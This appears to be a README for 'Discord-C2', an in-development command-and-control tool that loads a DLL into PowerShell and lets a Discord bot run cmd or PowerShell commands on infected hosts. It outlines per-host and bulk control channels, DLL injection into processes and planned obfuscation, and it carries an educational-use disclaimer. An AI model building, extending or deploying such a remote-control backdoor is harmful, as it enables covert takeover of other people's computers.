# Work in progress

#### Injecting the DLL in a PowerShell process:
```pwsh
Add-Type -path .\Discord-C2.dll
[DiscordC2.Server]::Start()
```

A .dc2 file containing your bot's token needs to be accessible in the folder where the application is going to run.
This is a temporary solution during development, it will be obfuscated to a much higher degree later


### Features
run cmd or powershell, and retrive results:
* `cmd ipconfig` runs ipconfig in cmd and returns result
* `pwsh dotnet --version` runs dotnet --version in powershell and returns result

![image](https://github.com/joaf123/Discord-C2/assets/56757601/13ab8281-410e-4b41-a693-c557d491fc9e)

With coming updates the bot will create a new channel when a new host is encountered. The channels name will reflect that of the infected computers hostname / IP. Commands entered here will run on that host **only**. 

In addition a **"Bulk/Batch Control"** channel will get setup by the bot where, commands can be triggered for all infected hosts.

---

### Planned features
* Slash command that takes an argument and runs it as CMD/PowerShell commands on the host, and replies with its results in chat.
* Slash command that takes the path to a DLL and attempts to inject it into some process on the host machine.
* Support for several hosts, each getting their separate channel in the discord server.
  * The channels lets you run commands against that specific host
  * A "main" channel will let you run commands in bulk
* Agent spawner that spawns agents using a specific bot token

---
 
**Intended Use:**

This code is intended for **educational purposes only**. It can be used to explore the research concepts presented and understand red team methodologies. 

**Not for Malicious Activity:**

This code should not be used for any malicious activities or real-world attacks. 

**Disclaimer:**

The authors are not responsible for any misuse of this code. 
